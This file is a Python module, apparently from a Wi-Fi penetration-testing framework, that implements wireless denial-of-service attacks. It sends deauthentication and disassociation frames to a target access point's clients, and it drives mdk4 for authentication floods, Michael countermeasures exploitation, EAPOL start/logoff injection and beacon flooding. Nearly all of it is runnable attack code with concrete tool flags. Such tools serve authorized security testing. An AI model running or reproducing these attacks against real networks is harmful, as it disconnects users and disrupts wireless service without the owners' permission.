"""DOS attack implementations, replacing dosAttacks.sh and its
aireplay-ng/mdk4 wrappers (deAuth.sh, deAss.sh, authenticationDOS.sh,
mcExploitation.sh, eapolPacketInjection.sh, beconFlooding.sh).
"""

import time

from core import colors, device
from core.project import Project
from core.shell import run_timed
from packet import deauth


def deauth_attack(
    iface: str,
    project: Project,
    bssid: str,
    channel: str,
    clients: list[str],
    packets: int = 5,
    iterations: int = 5,
    delay: int = 5,
) -> None:
    """Sends Deauthentication frames to each connected client, replacing deAuth.sh."""
    device.set_channel(iface, channel)
    targets = clients or [deauth.BROADCAST]

    for i in range(1, iterations + 1):
        project.log_msg(f"\n{colors.YELLOW}Iteration Number: {i}{colors.NC}")
        for client in targets:
            project.log_msg(f"{colors.YELLOW}Deauthenticating client: {client}{colors.NC}")
            deauth.send_deauth(iface, bssid, client, count=packets)
            time.sleep(delay)


def disassoc_attack(
    iface: str,
    project: Project,
    bssid: str,
    channel: str,
    clients: list[str],
    packets: int = 5,
    iterations: int = 5,
    delay: int = 5,
) -> None:
    """Sends Disassociation frames to each connected client, replacing deAss.sh."""
    device.set_channel(iface, channel)
    targets = clients or [deauth.BROADCAST]

    for i in range(1, iterations + 1):
        project.log_msg(f"\n{colors.YELLOW}Iteration Number: {i}{colors.NC}")
        for client in targets:
            project.log_msg(f"{colors.YELLOW}Disassociating client: {client}{colors.NC}")
            deauth.send_disassoc(iface, bssid, client, count=packets)
            time.sleep(delay)


def authentication_dos(
    iface: str,
    project: Project,
    bssid: str,
    minutes: int,
    iterations: int = 5,
    delay: int = 5,
) -> None:
    """Runs mdk4's authentication-flood DoS mode, replacing authenticationDOS.sh."""
    for i in range(1, iterations + 1):
        project.log_msg(f"\n{colors.YELLOW}Iteration Number: {i}{colors.NC}")
        # -a BSSID: send random data from random clients to try the DoS
        run_timed(["mdk4", iface, "a", "-a", bssid, "-m"], minutes)
        # -i BSSID: capture and repeat packets from authenticated clients
        run_timed(["mdk4", iface, "a", "-i", bssid, "-m"], minutes)
        time.sleep(delay)


def michael_countermeasures(
    iface: str,
    project: Project,
    bssid: str,
    minutes: int,
    iterations: int = 5,
    delay: int = 5,
) -> None:
    """Runs mdk4's Michael-countermeasures exploitation mode, replacing mcExploitation.sh."""
    for i in range(1, iterations + 1):
        project.log_msg(f"\n{colors.YELLOW}Iteration Number: {i}{colors.NC}")
        run_timed(["mdk4", iface, "m", "-t", bssid], minutes)
        # -j: use intelligent replay to create the DoS
        run_timed(["mdk4", iface, "m", "-t", bssid, "-j"], minutes)
        time.sleep(delay)


def eapol_injection(
    iface: str,
    project: Project,
    bssid: str,
    minutes: int,
    iterations: int = 5,
    delay: int = 5,
) -> None:
    """Runs mdk4's EAPOL start/logoff injection mode, replacing eapolPacketInjection.sh."""
    for i in range(1, iterations + 1):
        project.log_msg(f"\n{colors.YELLOW}Iteration Number: {i}{colors.NC}")
        run_timed(["mdk4", iface, "e", "-t", bssid, "-l"], minutes)
        time.sleep(delay)


def beacon_flood(iface: str, project: Project, minutes: int) -> None:
    """Runs mdk4's beacon-flood mode, replacing beconFlooding.sh."""
    run_timed(["mdk4", iface, "b", "-a", "-w", "nta", "-m"], minutes)
